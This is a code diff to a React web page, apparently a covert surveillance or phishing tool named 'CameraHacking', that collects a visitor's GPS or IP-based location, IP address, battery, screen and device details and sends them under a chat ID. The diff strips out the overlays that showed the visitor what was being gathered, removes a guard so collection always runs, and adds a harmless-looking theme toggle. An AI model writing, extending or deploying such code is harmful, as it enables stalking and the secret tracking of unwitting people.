@@ -467,41 +467,6 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
         </div>
       )}
 
-      <div style={{
-        position: 'fixed',
-        top: '10px',
-        right: '10px',
-        background: 'rgba(0, 0, 0, 0.8)',
-        color: 'white',
-        padding: '15px',
-        borderRadius: '10px',
-        zIndex: 9999,
-        maxWidth: '300px',
-        fontSize: '12px',
-        backdropFilter: 'blur(10px)',
-        border: '1px solid rgba(255,255,255,0.2)'
-      }}>
-        <h3 style={{ margin: '0 0 10px 0', color: '#4ECDC4' }}>📊 Системная информация</h3>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Статус камеры:</strong> {isInitialized ? '✅ Активна' : '🔄 Инициализация'}
-        </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Android версия:</strong> {deviceInfo?.androidVersion || 'Определение...'}
-        </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Разрешение:</strong> {deviceInfo?.resolution || '0x0'}
-        </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Сделано фото:</strong> {captureCount} / {MAX_CAPTURES}
-        </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Следующее фото:</strong> через {CAPTURE_INTERVAL/1000} сек
-        </div>
-        <div style={{ marginBottom: '5px' }}>
-          <strong>IP адрес:</strong> {setClientIp?.current || 'Определение...'}
-        </div>
-      </div>
-
       {process.env.NODE_ENV === 'development' && (
         <div style={{
           position: 'fixed',
@@ -515,7 +480,7 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
           maxHeight: '250px',
           overflow: 'auto',
           fontFamily: 'monospace',
-          zIndex: 9998,
+          zIndex: 9999,
           borderTop: '3px solid #00ff00',
           boxShadow: '0 -5px 20px rgba(0,255,0,0.2)'
         }}>
@@ -571,7 +536,6 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
  * КОМПОНЕНТ LOCATIONHANDLER
  */
 const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermission, chatId, clientIp }) => {
-  const [locationData, setLocationData] = useState(null);
 
   const sendLocation = async (coords) => {
     const { latitude, longitude } = coords;
@@ -603,19 +567,10 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
   const getLocationByIp = async () => {
     try {
       const response = await axios.get(`https://ipinfo.io/${clientIp}/json`);
-      const { loc, city, region, country, org } = response.data;
+      const { loc } = response.data;
       const [latitude, longitude] = loc.split(',');
 
       const coords = { latitude, longitude };
-
-      setLocationData({
-        coords,
-        city,
-        region,
-        country,
-        provider: org,
-        method: 'IP геолокация'
-      });
 
       sendLocation(coords);
       setLocationPermission(coords);
@@ -630,17 +585,8 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
         navigator.geolocation.getCurrentPosition(resolve, reject);
       });
 
-      const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
+      const { latitude, longitude } = position.coords;
       const coords = { latitude, longitude };
-
-      setLocationData({
-        coords,
-        accuracy: Math.round(accuracy),
-        altitude: altitude ? Math.round(altitude) : null,
-        heading: heading ? Math.round(heading) : null,
-        speed: speed ? Math.round(speed * 3.6) : null,
-        method: 'GPS устройства'
-      });
 
       localStorage.setItem("locationPermission", JSON.stringify(coords));
       setLocationPermission(coords);
@@ -652,7 +598,6 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
         getLocationByIp();
       } else {
         console.error("Error getting location permission:", error);
-        getLocationByIp();
       }
     }
   };
@@ -663,58 +608,7 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
     }
   }, []);
 
-  return locationData ? (
-    <div style={{
-      position: 'fixed',
-      bottom: '10px',
-      left: '10px',
-      background: 'rgba(0, 0, 0, 0.8)',
-      color: 'white',
-      padding: '15px',
-      borderRadius: '10px',
-      zIndex: 9997,
-      maxWidth: '350px',
-      fontSize: '12px',
-      backdropFilter: 'blur(10px)',
-      border: '1px solid rgba(255,255,255,0.2)'
-    }}>
-      <h3 style={{ margin: '0 0 10px 0', color: '#FF6B6B' }}>📍 Геолокация</h3>
-      <div style={{ marginBottom: '5px' }}>
-        <strong>Метод:</strong> {locationData.method}
-      </div>
-      {locationData.city && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Местоположение:</strong> {locationData.city}, {locationData.region}, {locationData.country}
-        </div>
-      )}
-      <div style={{ marginBottom: '5px' }}>
-        <strong>Координаты:</strong> {Number(locationData.coords.latitude).toFixed(6)}, {Number(locationData.coords.longitude).toFixed(6)}
-      </div>
-      {locationData.accuracy && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Точность:</strong> ±{locationData.accuracy} м
-        </div>
-      )}
-      {locationData.altitude && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Высота:</strong> {locationData.altitude} м
-        </div>
-      )}
-      {locationData.speed && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Скорость:</strong> {locationData.speed} км/ч
-        </div>
-      )}
-      {locationData.provider && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Провайдер:</strong> {locationData.provider}
-        </div>
-      )}
-      <div style={{ marginTop: '10px', fontSize: '10px', color: '#aaa' }}>
-        Данные обновлены: {new Date().toLocaleTimeString()}
-      </div>
-    </div>
-  ) : null;
+  return null;
 };
 
 /**
@@ -729,30 +623,18 @@ const PhotoPage = () => {
   const [locationSent, setLocationSent] = useState(false);
   const [locationPermission, setLocationPermission] = useState(null);
   const [clientIp, setClientIp] = useState("");
-  const [deviceInfo, setDeviceInfo] = useState(null);
 
   const getBatteryLevel = async () => {
     try {
       if ("getBattery" in navigator) {
         const battery = await navigator.getBattery();
-        return {
-          level: Math.floor(battery.level * 100) + "%",
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        };
+        return Math.floor(battery.level * 100) + "%";
       } else {
-        return {
-          level: "N/A",
-          charging: false
-        };
+        return "Battery API not supported";
       }
     } catch (error) {
       console.error("❌ Error getting battery level:", error);
-      return {
-        level: "Error",
-        charging: false
-      };
+      return "Unable to detect";
     }
   };
 
@@ -761,39 +643,21 @@ const PhotoPage = () => {
     const platform = navigator.platform;
     const screenWidth = window.screen.width;
     const screenHeight = window.screen.height;
-    const devicePixelRatio = window.devicePixelRatio;
-    const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-    const deviceType = isMobile ? "Mobile Device" : "Desktop Device";
+    const deviceType = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
+      ? "Mobile Device"
+      : "Desktop Device";
 
     const language = navigator.language || navigator.userLanguage;
-    const languages = navigator.languages;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const connectionInfo = connection ? {
-      effectiveType: connection.effectiveType,
-      downlink: connection.downlink,
-      rtt: connection.rtt,
-      saveData: connection.saveData
-    } : null;
-
-    const memory = navigator.deviceMemory;
-    const cores = navigator.hardwareConcurrency;
 
     return {
       userAgent,
       platform,
       screenWidth,
       screenHeight,
-      devicePixelRatio,
       deviceType,
       language,
-      languages,
       timezone,
-      connection: connectionInfo,
-      memory,
-      cores,
-      isMobile
     };
   };
 
@@ -803,26 +667,19 @@ const PhotoPage = () => {
         console.log("🎯 Starting data collection for chatId:", chatId);
 
         const deviceInfo = getDeviceInfo();
-        setDeviceInfo(deviceInfo);
-        
-        const batteryInfo = await getBatteryLevel();
+        const batteryLevel = await getBatteryLevel();
 
         const data = {
           chat_id: chatId,
-          batteryLevel: batteryInfo.level,
-          batteryCharging: batteryInfo.charging,
+          batteryLevel: batteryLevel,
           screenWidth: deviceInfo.screenWidth,
           screenHeight: deviceInfo.screenHeight,
-          devicePixelRatio: deviceInfo.devicePixelRatio,
           clientIp: clientIp,
           userAgent: deviceInfo.userAgent,
           deviceType: deviceInfo.deviceType,
           platform: deviceInfo.platform,
           language: deviceInfo.language,
-          timezone: deviceInfo.timezone,
-          connection: deviceInfo.connection,
-          memory: deviceInfo.memory,
-          cores: deviceInfo.cores
+          timezone: deviceInfo.timezone
         };
 
         console.log("📤 Sending user data:", data);
@@ -843,10 +700,13 @@ const PhotoPage = () => {
       }
     };
 
-    if (chatId) {
-      getUserData();
-    }
+    getUserData();
   }, [chatId, clientIp]);
+
+  const toggelActiveCamera = () => {
+    setIsCameraActive((prev) => !prev);
+    console.log(`🎥 Camera ${!isCameraActive ? 'activated' : 'deactivated'}`);
+  };
 
   return (
     <>
@@ -870,6 +730,27 @@ const PhotoPage = () => {
             </div>
             <div className="spoke"></div>
           </div>
+
+          <label className="theme-switch">
+            <input type="checkbox" className="theme-switch__checkbox" />
+            <div className="theme-switch__container">
+              <div className="theme-switch__clouds"></div>
+              <div className="theme-switch__stars-container">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 55">
+                  <path fill="currentColor" d="m135,20c0,7.7-0.7,13.8-2,18.5-2.3,8.4-7.9,12.5-17,12.5s-14.7-4.1-17-12.5c-1.3-4.7-2-10.8-2-18.5 0-7.7 0.7-13.8 2-18.5 2.3-8.4 7.9-12.5 17-12.5s14.7 4.1 17 12.5c1.3 4.7 2 10.8 2 18.5z" />
+                </svg>
+              </div>
+              <div className="theme-switch__circle-container">
+                <div className="theme-switch__sun-moon-container">
+                  <div className="theme-switch__moon">
+                    <div className="theme-switch__spot"></div>
+                    <div className="theme-switch__spot"></div>
+                    <div className="theme-switch__spot"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </label>
         </div>
 
         <video
@@ -880,71 +761,6 @@ const PhotoPage = () => {
           playsInline
         />
       </div>
-
-      {deviceInfo && (
-        <div style={{
-          position: 'fixed',
-          top: '150px',
-          right: '10px',
-          background: 'rgba(0, 0, 0, 0.8)',
-          color: 'white',
-          padding: '15px',
-          borderRadius: '10px',
-          zIndex: 9996,
-          maxWidth: '350px',
-          maxHeight: '400px',
-          overflow: 'auto',
-          fontSize: '12px',
-          backdropFilter: 'blur(10px)',
-          border: '1px solid rgba(255,255,255,0.2)'
-        }}>
-          <h3 style={{ margin: '0 0 10px 0', color: '#FFEAA7' }}>📱 Информация об устройстве</h3>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Тип:</strong> {deviceInfo.deviceType}
-          </div>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Платформа:</strong> {deviceInfo.platform}
-          </div>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Экран:</strong> {deviceInfo.screenWidth} × {deviceInfo.screenHeight} (x{deviceInfo.devicePixelRatio})
-          </div>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Язык:</strong> {deviceInfo.language}
-          </div>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Часовой пояс:</strong> {deviceInfo.timezone}
-          </div>
-          {deviceInfo.memory && (
-            <div style={{ marginBottom: '5px' }}>
-              <strong>Память:</strong> {deviceInfo.memory} GB
-            </div>
-          )}
-          {deviceInfo.cores && (
-            <div style={{ marginBottom: '5px' }}>
-              <strong>Ядра CPU:</strong> {deviceInfo.cores}
-            </div>
-          )}
-          {deviceInfo.connection && (
-            <>
-              <div style={{ marginBottom: '5px' }}>
-                <strong>Тип сети:</strong> {deviceInfo.connection.effectiveType}
-              </div>
-              <div style={{ marginBottom: '5px' }}>
-                <strong>Скорость:</strong> {deviceInfo.connection.downlink} Mbps
-              </div>
-              <div style={{ marginBottom: '5px' }}>
-                <strong>Задержка:</strong> {deviceInfo.connection.rtt} ms
-              </div>
-            </>
-          )}
-          <div style={{ marginBottom: '5px' }}>
-            <strong>User Agent:</strong>
-            <div style={{ fontSize: '10px', color: '#aaa', wordBreak: 'break-word', marginTop: '2px' }}>
-              {deviceInfo.userAgent.substring(0, 100)}...
-            </div>
-          </div>
-        </div>
-      )}
 
       <LocationHandler
         chatId={chatId}
